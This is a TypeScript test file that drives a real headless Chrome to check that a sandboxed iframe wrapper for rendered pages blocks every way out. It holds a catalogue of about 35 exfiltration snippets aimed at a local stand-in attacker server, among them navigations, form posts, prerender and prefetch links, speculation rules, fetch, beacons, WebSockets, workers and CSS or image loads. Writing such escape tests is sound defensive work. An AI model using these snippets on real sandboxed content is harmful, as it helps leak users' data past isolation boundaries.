import { spawn, type ChildProcess } from "node:child_process";
import { existsSync, mkdtempSync, rmSync } from "node:fs";
import { createServer, type Server } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { pageDocument, wrapperDocument } from "./artifactdoc.js";

/**
 * Every way out of a page's frame, tried in a real Chrome. Each attempt aims
 * at a server standing in for an attacker; the test holds that it is sent no
 * request at all, and that the page was really running when it tried. A
 * control runs the flat frame KOS had before, which does leak, so the test is
 * known to see a leak when there is one. Skipped without Chrome.
 *
 * What it does not hold: a navigation attempt still makes Chrome open a
 * connection (DNS and TCP, no request) to the host it names, before the
 * policy refuses it (artifactdoc.ts). It counts requests, not connections.
 */

const CHROME = ["/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", "/usr/bin/google-chrome", "/usr/bin/google-chrome-stable", "/usr/bin/chromium"].find((p) => existsSync(p));

/** The attempts, each a script the page runs once it is up; `E` is the attacker. */
function attempts(E: string): Record<string, string> {
  const link = (how: string): string => how;
  return {
    href: `location.href = "${E}/href?d=1"`,
    assign: `location.assign("${E}/assign?d=1")`,
    replace: `location.replace("${E}/replace?d=1")`,
    open: `window.open("${E}/open?d=1")`,
    form: `const f = document.createElement("form"); f.method = "post"; f.action = "${E}/form"; document.body.append(f); f.submit()`,
    formMarkup: `document.body.innerHTML = '<form action="${E}/formmarkup"></form>'; document.forms[0].submit()`,
    metaRefresh: `const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=${E}/meta"; document.head.append(m)`,
    metaMarkup: `document.head.insertAdjacentHTML("beforeend", '<meta http-equiv="refresh" content="0;url=${E}/metamarkup">')`,
    anchor: `const a = document.createElement("a"); a.href = "${E}/aself?d=1"; document.body.append(a); a.click()`,
    anchorBlank: `const a = document.createElement("a"); a.href = "${E}/ablank"; a.target = "_blank"; document.body.append(a); a.click()`,
    anchorTop: `const a = document.createElement("a"); a.href = "${E}/atop"; a.target = "_top"; document.body.append(a); a.click()`,
    download: `const a = document.createElement("a"); a.href = "${E}/download"; a.download = "x"; document.body.append(a); a.click()`,
    top: `top.location = "${E}/top"`,
    parent: `parent.location = "${E}/parent"`,
    history: `try { history.pushState({}, "", "${E}/push"); } catch (e) {} location.reload()`,
    iframeHash: `const f = document.createElement("iframe"); f.src = "${E}/frame#d=1"; document.body.append(f)`,
    iframeMarkup: `document.body.innerHTML = '<iframe src="${E}/framemarkup#d=1"></iframe>'`,
    dataNav: `location.href = "data:text/html,<script>fetch('${E}/datanav')<\\/script>"`,
    blobNav: `location.href = URL.createObjectURL(new Blob(["<script>fetch('${E}/blobnav')<\\/script>"], { type: "text/html" }))`,
    prerender: link(`const l = document.createElement("link"); l.rel = "prerender"; l.href = "${E}/prerender"; document.head.append(l)`),
    prerenderMarkup: link(`document.body.insertAdjacentHTML("beforeend", '<link rel="pre' + 'render" href="${E}/prerendermarkup">')`),
    prerenderWrite: link(`document.write('<link rel="prerender" href="${E}/prerenderwrite">')`),
    prerenderParser: link(`const d = new DOMParser().parseFromString('<link rel="prerender" href="${E}/prerenderparser">', "text/html"); document.head.append(document.adoptNode(d.querySelector("link")))`),
    prerenderNS: link(`const l = document.createElementNS("http://www.w3.org/1999/xhtml", "link"); l.rel = "prerender"; l.href = "${E}/prerenderns"; document.head.append(l)`),
    prerenderRange: link(`document.head.append(document.createRange().createContextualFragment('<link rel="prerender" href="${E}/prerenderrange">'))`),
    prerenderShadow: link(`const h = document.createElement("div"); document.body.append(h); h.attachShadow({ mode: "open" }).innerHTML = '<link rel="prerender" href="${E}/prerendershadow">'`),
    prerenderTemplate: link(`const t = document.createElement("template"); t.innerHTML = '<link rel="prerender" href="${E}/prerendertemplate">'; document.head.append(t.content.cloneNode(true))`),
    prerenderRealm: link(`const f = document.createElement("iframe"); document.body.append(f); const l = f.contentDocument.createElement("link"); l.rel = "prerender"; l.href = "${E}/prerenderrealm"; document.head.append(l)`),
    prefetchHints: link(`for (const rel of ["prefetch", "preload", "preconnect", "dns-prefetch", "modulepreload"]) { const l = document.createElement("link"); l.rel = rel; l.as = "fetch"; l.href = "${E}/" + rel; document.head.append(l); }`),
    speculation: `const s = document.createElement("script"); s.type = "speculationrules"; s.text = JSON.stringify({ prefetch: [{ source: "list", urls: ["${E}/speculation"] }] }); document.head.append(s)`,
    fetch: `fetch("${E}/fetch").catch(() => {})`,
    beacon: `navigator.sendBeacon("${E}/beacon", "d")`,
    socket: `try { new WebSocket("${E.replace("http", "ws")}/ws"); } catch (e) {} try { new EventSource("${E}/sse"); } catch (e) {}`,
    worker: `try { new Worker(URL.createObjectURL(new Blob(["fetch('${E}/worker')"], { type: "text/javascript" }))); } catch (e) {}`,
    css: `const s = document.createElement("style"); s.textContent = "body{background:url(${E}/css)} @font-face{font-family:x;src:url(${E}/font)}"; document.head.append(s)`,
    image: `new Image().src = "${E}/image"; document.body.insertAdjacentHTML("beforeend", '<svg><image href="${E}/svgimage"/></svg>')`,
    object: `document.body.insertAdjacentHTML("beforeend", '<object data="${E}/object"></object>')`,
  };
}

/** A page that says it is up, then tries one way out. */
const attempt = (code: string): string => `<p>page</p><script>top.postMessage("alive", "*"); setTimeout(() => { try { ${code} } catch (e) {} }, 50)</script>`;

interface Run {
  alive: boolean;
  requests: string[];
}

describe.skipIf(!CHROME)("a page's frame in a real Chrome", () => {
  let evil: Server;
  let host: Server;
  let chrome: ChildProcess;
  let profile = "";
  let E = "";
  let base = "";
  const requests: string[] = [];
  const pages = new Map<string, string>();
  let send: (method: string, params?: Record<string, unknown>) => Promise<Record<string, unknown>>;
  let close = (): void => undefined;

  const listen = (server: Server): Promise<number> =>
    new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve((server.address() as { port: number }).port)));

  beforeAll(async () => {
    evil = createServer((req, res) => {
      requests.push(req.url ?? "");
      res.writeHead(200, { "content-type": "text/html", "access-control-allow-origin": "*" }).end("<p>evil</p>");
    });
    E = `http://127.0.0.1:${await listen(evil)}`;
    host = createServer((req, res) => res.writeHead(200, { "content-type": "text/html" }).end(pages.get(req.url ?? "") ?? ""));
    base = `http://127.0.0.1:${await listen(host)}`;
    profile = mkdtempSync(join(tmpdir(), "kos-artifact-chrome-"));
    const port = 9400 + Math.floor(Math.random() * 400);
    chrome = spawn(CHROME!, ["--headless=new", `--remote-debugging-port=${port}`, `--user-data-dir=${profile}`, "--no-first-run", "about:blank"], { stdio: "ignore" });
    let version: { webSocketDebuggerUrl: string } | undefined;
    for (let i = 0; i < 300 && !version; i++) {
      version = await fetch(`http://127.0.0.1:${port}/json/version`).then((r) => r.json() as Promise<{ webSocketDebuggerUrl: string }>).catch(() => undefined);
      if (!version) await new Promise((r) => setTimeout(r, 100));
    }
    const ws = new WebSocket(version!.webSocketDebuggerUrl);
    await new Promise((r) => (ws.onopen = r));
    let n = 0;
    const wait = new Map<number, (m: { result?: Record<string, unknown> }) => void>();
    ws.onmessage = (e) => {
      const m = JSON.parse(String(e.data)) as { id?: number; result?: Record<string, unknown> };
      if (m.id) wait.get(m.id)?.(m);
    };
    const raw = (method: string, params: Record<string, unknown> = {}, sessionId?: string): Promise<Record<string, unknown>> =>
      new Promise((resolve) => {
        const id = ++n;
        wait.set(id, (m) => resolve(m.result ?? {}));
        ws.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
      });
    const target = await raw("Target.createTarget", { url: "about:blank" });
    const session = (await raw("Target.attachToTarget", { targetId: target.targetId, flatten: true })).sessionId as string;
    send = (method, params = {}) => raw(method, params, session);
    close = () => ws.close();
  }, 30_000);

  afterAll(async () => {
    close();
    // Chrome writes its profile as it goes; the folder goes once it has exited.
    if (chrome && chrome.exitCode === null) await new Promise((r) => (chrome.once("exit", r), chrome.kill()));
    evil?.close();
    host?.close();
    if (profile) rmSync(profile, { recursive: true, force: true, maxRetries: 5 });
  });

  /** The dashboard's side: the frame as ArtifactPage draws it, around one page. */
  async function run(name: string, frame: string): Promise<Run> {
    const path = `/${name}`;
    pages.set(path, `<!doctype html><body><script>addEventListener("message", (e) => { if (e.data === "alive") document.title = "alive"; })</script><iframe sandbox="allow-scripts" srcdoc="${frame.replace(/&/g, "&amp;").replace(/"/g, "&quot;")}"></iframe></body>`);
    requests.length = 0;
    await send("Page.navigate", { url: `${base}${path}` });
    await new Promise((r) => setTimeout(r, 1300));
    const title = (await send("Runtime.evaluate", { expression: "document.title", returnByValue: true })).result as { value?: string } | undefined;
    return { alive: title?.value === "alive", requests: [...requests] };
  }

  const page = (code: string): string => pageDocument({ html: attempt(code), tokens: {}, mode: "dark", css: "", libraries: [] });

  it("sees a leak when there is one: the flat frame KOS had sends a navigation's request", async () => {
    const flat = await run("control", page(attempts(E).href!).replace(/<meta http-equiv="Content-Security-Policy"[^>]*>/, `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'">`));
    expect(flat.alive).toBe(true);
    expect(flat.requests.join(" ")).toContain("/href");
  }, 20_000);

  it("lets no way out send a single request, with the page running each time", async () => {
    const results: Record<string, Run> = {};
    for (const [name, code] of Object.entries(attempts(E))) results[name] = await run(name, wrapperDocument(page(code)));
    const notRunning = Object.entries(results).filter(([, r]) => !r.alive).map(([name]) => name);
    const leaked = Object.fromEntries(Object.entries(results).filter(([, r]) => r.requests.length > 0).map(([name, r]) => [name, r.requests]));
    expect(notRunning).toEqual([]);
    expect(leaked).toEqual({});
  }, 180_000);
});
